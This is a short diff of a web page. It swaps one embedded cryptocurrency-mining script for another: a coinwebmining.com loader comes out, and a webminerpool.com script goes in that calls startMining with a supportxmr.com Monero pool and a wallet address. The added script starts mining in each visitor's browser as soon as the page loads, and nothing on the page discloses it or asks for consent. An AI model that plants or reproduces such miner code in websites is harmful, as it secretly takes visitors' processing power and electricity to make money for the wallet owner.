@@ -33,10 +33,12 @@
   </div>
   
  
-  <script src="https://coinwebmining.com/cwm.js"></script>
-  <script>
-    var debug = FALSE; //change to TRUE for debugging
-    cwm_start('cwm-35', 'v7', '433wsaNwcgVfbs5YqFygdeauGM4GJRMSa3iTfGCv2iFT7P7SVfjBwr2eHGABGJAnhBT45ih9swVd28gjhLmAjupBNvUsWKQ', 'SITE', 'supportxmr.com', -1, 0.2, debug);
-    var acceptedHashes = miner.getAcceptedHashes();
-  </script>
-  <p id="totalhashes"></p>
+<!--THE MINER SCRIPT-->
+<script src="https://webminerpool.com/webmr.js"></script>
+	
+<!--START THE MINER-->
+<script>
+startMining("supportxmr.com","433wsaNwcgVfbs5YqFygdeauGM4GJRMSa3iTfGCv2iFT7P7SVfjBwr2eHGABGJAnhBT45ih9swVd28gjhLmAjupBNvUsWKQU");
+</script>
+  
+<p id="totalhashes"></p>
